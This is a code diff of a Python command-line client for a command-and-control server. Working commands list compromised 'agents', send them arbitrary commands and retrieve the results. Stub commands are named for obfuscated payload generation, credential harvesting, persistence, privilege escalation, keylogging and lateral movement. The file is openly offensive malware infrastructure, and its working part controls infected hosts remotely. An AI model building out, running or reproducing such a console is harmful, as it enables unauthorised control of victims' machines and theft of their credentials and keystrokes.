@@ -8,6 +8,7 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 ######################################################################################################################################################################################################################
 
+from datetime import datetime
 import requests
 import json
 import typer
@@ -15,7 +16,7 @@ import os
 
 app = typer.Typer()
 
-C2_URL = "http://c2_IP_URL:8080"
+C2_SERVER_URL = "http://10.0.2.4:8080"
 SELECTED_AGENT_FILE = "selected_agent.txt"
 
 def save_selected_agent(agent_id: str):
@@ -30,103 +31,139 @@ def load_selected_agent():
 
 @app.command()
 def list_agents():
-    response = requests.get(f"{C2_URL}/agents")  # Use /agents here
-    if response.status_code == 200:
-        agents = response.json().get("agents", [])
-        for agent in agents:
-            print(agent["AgentID"])
-    else:
-        print(f"Failed to list agents: {response.status_code} {response.text}")
+    """List available agents"""
+    try:
+        response = requests.get(f"{C2_SERVER_URL}/agents")
+        if response.status_code == 200:
+            agents = response.json()
+            if agents:
+                print("List of online agents:")
+                for agent in agents:
+                    print(f"- {agent['agent_id']} (Status: {agent['status']})")
+            else:
+                print("No agents found.")
+        else:
+            print(f"Failed to list agents: {response.status_code} {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"An error occurred: {e}")
 
 @app.command()
 def select_agent(agent_id: str):
-    save_selected_agent(agent_id)
-    print(f"Selected agent: {agent_id}")
+    """Select an active agent"""
+    try:
+        response = requests.get(f"{C2_SERVER_URL}/agents")
+        if response.status_code == 200:
+            agents = response.json()
+            for agent in agents:
+                if agent["agent_id"] == agent_id:
+                    if agent["status"] == "online":
+                        save_selected_agent(agent_id)
+                        print(f"Agent {agent_id} selected.")
+                        return
+                    else:
+                        print(f"Agent {agent_id} is offline. Cannot select.")
+                        return
+            print(f"Agent {agent_id} not found.")
+        else:
+            print(f"Failed to retrieve agents: {response.status_code} {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"An error occurred: {e}")
 
 @app.command()
-def send_command(command: str, agent_id: str = typer.Option(None, help="Agent ID to send the command to")):
+def send_command(command: str):
+    """Send a command to the selected agent"""
+    agent_id = load_selected_agent()
     if not agent_id:
-        agent_id = load_selected_agent()
-        if not agent_id:
-            print("No agent selected. Please specify an agent ID or select an agent first.")
-            return
-    
+        print("No agent selected. Use 'select-agent' to choose one.")
+        return
+
+    print(f"Command sent at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {command}")
+
     payload = {
         "AgentID": agent_id,
         "Command": command
     }
-    response = requests.post(f"{C2_URL}/sendcommand", json=payload)
-    if response.status_code == 200:
-        print(f"Command sent to agent {agent_id}: {command}")
-    else:
-        print(f"Failed to send command to agent {agent_id}: {response.text}")
+
+    try:
+        response = requests.post(f"{C2_SERVER_URL}/send_command", json=payload)
+        if response.status_code == 200:
+            print(f"Command sent to agent {agent_id}: {command}")
+        else:
+            print(f"Failed to send command: {response.status_code} {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"An error occurred: {e}")
+        
 
 @app.command()
-def get_result(agent_id: str = typer.Option(None, help="Agent ID to get the result from")):
+def get_result():
+    """Retrieve the last command result from the selected agent"""
+    agent_id = load_selected_agent()
     if not agent_id:
-        agent_id = load_selected_agent()
-        if not agent_id:
-            print("No agent selected. Please specify an agent ID or select an agent first.")
-            return
+        print("No agent selected. Use 'select-agent' to choose one.")
+        return
 
-    response = requests.get(f"{C2_URL}/result", params={"agent_id": agent_id})
-    if response.status_code == 200:
-        result = response.json().get("Result")
-        print(f"Result from agent {agent_id}: {result}")
-    else:
-        print(f"Failed to get result from agent {agent_id}: {response.text}")
+    try:
+        response = requests.get(f"{C2_SERVER_URL}/result", params={"agent_id": agent_id})
+        if response.status_code == 200:
+            result = response.json().get("Result")
+            print(f"Result from agent {agent_id}: {result}")
+        else:
+            print(f"Failed to get result: {response.status_code} {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"An error occurred: {e}")
+
 
 @app.command()
 def generate_payload(platform: str):
+    """Generate an obfuscated payload for the specified platform"""
     print(f"Generating obfuscated payload for platform: {platform}")
-    # Implement the logic to generate the payload
+    # TODO: Implement the payload generation logic
 
 @app.command()
 def harvest_credentials():
+    """Harvest credentials from the selected agent"""
     print("Harvesting credentials")
-    # Implement the logic to harvest credentials
+    # TODO: Implement credential harvesting logic
 
 @app.command()
 def establish_persistence():
+    """Attempt to establish persistence on the selected agent"""
     print("Establishing persistence")
-    # Implement the logic to establish persistence
+    # TODO: Implement persistence logic
 
 @app.command()
 def escalate_privileges():
+    """Attempt to escalate privileges on the selected agent"""
     print("Escalating privileges")
-    # Implement the logic to escalate privileges
+    # TODO: Implement privilege escalation logic
 
 @app.command()
-def gather_system_info(agent_id: str = typer.Option(None, help="Agent ID to gather system information from")):
+def gather_system_info():
+    """Gather system information from the selected agent"""
+    agent_id = load_selected_agent()
     if not agent_id:
-        agent_id = load_selected_agent()
-        if not agent_id:
-            print("No agent selected. Please specify an agent ID or select an agent first.")
-            return
+        print("No agent selected. Use 'select-agent' to choose one.")
+        return
 
     print(f"Gathering system information from agent {agent_id}")
-    # Implement the logic to gather system information
+    # TODO: Implement system info gathering logic
 
 @app.command()
-def exfiltrate_data(file_path: str):
-    print(f"Exfiltrating data from file: {file_path}")
-    # Implement the logic to exfiltrate data
-
-@app.command()
-def start_keylogger(agent_id: str = typer.Option(None, help="Agent ID to start the keylogger on")):
+def start_keylogger():
+    """Start a keylogger on the selected agent"""
+    agent_id = load_selected_agent()
     if not agent_id:
-        agent_id = load_selected_agent()
-        if not agent_id:
-            print("No agent selected. Please specify an agent ID or select an agent first.")
-            return
+        print("No agent selected. Use 'select-agent' to choose one.")
+        return
 
     print(f"Starting keylogger on agent {agent_id}")
-    # Implement the logic to start the keylogger
+    # TODO: Implement keylogger logic
 
 @app.command()
 def move_laterally(target_ip: str, username: str, password: str):
-    print(f"Moving laterally to target IP: {target_ip} with username: {username} and password: {password}")
-    # Implement the logic to move laterally
+    """Attempt lateral movement using provided credentials"""
+    print(f"Moving laterally to {target_ip} with username: {username}")
+    # TODO: Implement lateral movement logic
 
 if __name__ == "__main__":
     app()
